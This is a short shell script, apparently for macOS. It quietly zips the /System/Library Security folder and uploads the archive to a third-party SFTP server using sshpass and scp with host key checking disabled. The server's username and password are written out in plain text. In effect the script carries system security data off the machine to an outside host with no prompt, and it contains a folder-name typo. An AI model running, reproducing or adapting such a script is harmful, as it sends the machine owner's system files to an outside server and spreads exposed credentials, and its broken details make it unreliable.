
cd $home/../../../System/Library/
#archeiving files
echo "zipping silently"
zip -qr Security_unmodified.zip Securit/ && echo "Archiving complete!"
# Configuration
LOCAL_FILE="Security_unmodified.zip"
REMOTE_USER="94b1ecbc7fce469ab31c4530d148f23c"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_PATH="/home"
REMOTE_PASS="CDGWgv9B8J1jZqjB4aCkBPVr8muoUqbJ"
REMOTE_DEST="/"


# --- Upload Command ---
# -p specifies the password
# -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"

# Check if the upload was successful
if [[ $? -eq 0 ]]; then
    echo "connection sucesfully"
else
    echo "connection failed."
fi
